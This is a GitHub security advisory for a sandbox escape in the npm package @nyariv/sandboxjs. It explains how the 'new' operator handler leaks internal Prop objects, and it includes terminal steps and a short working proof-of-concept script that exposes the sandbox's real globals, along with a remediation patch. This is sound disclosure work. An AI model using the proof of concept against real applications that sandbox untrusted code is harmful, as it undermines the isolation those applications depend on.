# [M] SandboxJS: Sandbox Escape via Prop Object Leak in New Handler

## Summary
Severity: Medium
Advisory: GHSA-hg73-4w7g-q96w
CVE: CVE-2026-34217
CWE: CWE-668
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-03
Source: https://github.com/advisories/GHSA-hg73-4w7g-q96w
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.36

## Details
## Description

A scope modification vulnerability exists in `@nyariv/sandboxjs` version 0.8.35 and below. The vulnerability allows untrusted sandboxed code to leak internal interpreter objects through the `new` operator, exposing sandbox scope objects in the scope hierarchy to untrusted code; an unexpected and undesired exploit. While this could allow modifying scopes inside the sandbox, code evaluation remains sandboxed and prototypes remain protected throughout the execution.

## Vulnerable Code Location

### Primary: The `New` Operator Handler

**File**: `src/executor.ts`, lines 1275–1280

```typescript
addOps<new (...args: unknown[]) => unknown, unknown[]>(
  LispType.New,
  ({ done, a, b, context }) => {
    if (!context.ctx.globalsWhitelist.has(a) && !context.ctx.sandboxedFunctions.has(a)) {
      throw new SandboxAccessError(`Object construction not allowed: ${a.constructor.name}`);
    }
    done(undefined, new a(...b));  // ← b is NOT sanitized, return is NOT sanitized
  },
);
```

This handler has **two missing sanitization steps**:

1. **Arguments (`b`) are not passed through `valueOrProp()`** — Constructor arguments contain raw `Prop` objects (internal interpreter wrappers) instead of extracted values.

2. **Return value is not passed through `getGlobalProp()` or `sanitizeArray()`** — The constructed object is returned directly to the execution tree without any sanitization.

### Comparison: The `Call` Handler (Correctly Implemented)

**File**: `src/executor.ts`, lines 493–605

```typescript
addOps<unknown, Lisp[], any>(LispType.Call, ({ done, a, b, obj, context }) => {
  // ...
  const vals = b
    .map((item) => {
      if (item instanceof SpreadArray) {
        return [...item.item];
      } else {
        return [item];
      }
    })
    .flat()
    .map((item) => valueOrProp(item, context));  // ← Arguments ARE sanitized
  // ...
  let ret = evl ? evl(obj.context[obj.prop], ...vals) : (obj.context[obj.prop](...vals));
  ret = getGlobalProp(ret, context) || ret;  // ← Return IS sanitized
  sanitizeArray(ret, context);               // ← Return IS sanitized
  done(undefined, ret);
});
```

The `Call` handler correctly sanitizes both arguments (via `valueOrProp`) and return values (via `getGlobalProp` and `sanitizeArray`). The `New` handler does neither.

---

## Why This Is Vulnerable

### Step 1: What is a Prop Object?

The sandbox interpreter wraps every value access in a `Prop` object (defined at `src/utils.ts`, lines 565–582). A `Prop` has:

```typescript
class Prop {
  context: any;       // The object the property belongs to
  prop: PropertyKey;  // The property name
  isConst: boolean;
  isGlobal: boolean;
  isVariable: boolean;
}
```

When sandboxed code accesses a variable like `isNaN`, the interpreter creates `Prop(scope.allVars, 'isNaN')`. The `context` field is a direct reference to the scope's variable storage object.

### Step 2: What is in `scope.allVars`?

At the global scope level, `scope.allVars` is the same object as `options.globals` — the SAFE_GLOBALS object containing:

```javascript
{
  globalThis: <real globalThis>,
  Function: <real Function constructor>,
  eval: <real eval function>,
  console: { log: console.log, ... },
  Array, Object, Map, Set, Promise, Date, Error, RegExp,
  isNaN, parseInt, parseFloat, ...
}
```

These are the **real** host JavaScript objects. The sandbox normally protects them by intercepting reads through the Prop handler and replacing dangerous ones via the evals Map.

### Step 3: How the Prop Leaks Through `new`

When sandboxed code executes `new Constructor(someVariable)`:

1. The interpreter evaluates `someVariable` — this produces a `Prop` object: `Prop(scope.allVars, 'someVariable')`
2. The `New` handler receives this `Prop` as-is in the `b` array (no `valueOrProp()` call)
3. `new Constructor(...[Prop])` passes the raw `Prop` object to the constructor function
4. Inside the constructor, the `Prop` is received as a named parameter
5. The constructor reads `arg.context` — this is the raw `scope.allVars` object containing all real globals
6. The constructor stores this reference: `this.scope = arg.context`
7. The constructed object is returned without sanitization

## Proof of Concept

### Step-by-Step Reproduction (Terminal)

#### Step 1: Create a new directory and initialize

```bash
mkdir sandboxjs-poc
cd sandboxjs-poc
npm init -y
```

#### Step 2: Set module type to ESM

```bash
node -e "const p=require('./package.json');p.type='module';require('fs').writeFileSync('package.json',JSON.stringify(p,null,2))"
```

#### Step 3: Install the vulnerable package

```bash
npm install @nyariv/sandboxjs@0.8.35
```

#### Step 4: Create the minimal exploit

```bash
cat > exploit.mjs << 'EOF'
import pkg from '@nyariv/sandboxjs';
const Sandbox = pkg.default || pkg;
const sandbox = new Sandbox();
const {scope} = sandbox.compile(`function E(a){this.scope=a.context}return new E(isNaN)`)({}).run();
console.log(scope);
EOF
```

#### Step 5: Run it

```bash
node exploit.mjs
```

## Impact

An attacker who can control code executed inside the sandbox can modify scope variables above its current available scope

The attack requires **no authentication**, **no user interaction**, and works with **default sandbox configuration**. The only requirement is that the host application reads the return value from `sandbox.compile(code)({}).run()`, which is the standard and documented usage pattern.

---

## Suggested Remediation

### Fix 1: Sanitize New Handler Arguments (Critical)

Add `valueOrProp()` to constructor arguments, matching the Call handler's behavior:

```typescript
// src/executor.ts line 1275-1280
addOps<new (...args: unknown[]) => unknown, unknown[]>(
  LispType.New,
  ({ done, a, b, context }) => {
    if (!context.ctx.globalsWhitelist.has(a) && !context.ctx.sandboxedFunctions.has(a)) {
      throw new SandboxAccessError(`Object construction not allowed: ${a.constructor.name}`);
    }
    const sanitizedArgs = b.map((item) => valueOrProp(item, context));
    const result = new a(...sanitizedArgs);
    const sanitized = getGlobalProp(result, context) || result;
    sanitizeArray(sanitized, context);
    done(undefined, sanitized);
  },
);
```

### Fix 2: Sanitize Sandbox Return Values (Defense in Depth)

Add deep sanitization in `Sandbox.ts` to strip internal references from any value returned to the host, regardless of how it was produced.

### Fix 3: Freeze the Globals Object (Defense in Depth)

Freeze or seal `options.globals` and `scope.allVars` after construction to prevent mutation via the Prop leak:

```typescript
Object.freeze(options.globals);
```

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-hg73-4w7g-q96w
- https://nvd.nist.gov/vuln/detail/CVE-2026-34217
- https://github.com/nyariv/SandboxJS/commit/abc02f657279e51a4aaad2bc8f99f3e37a01b287
- https://github.com/nyariv/SandboxJS
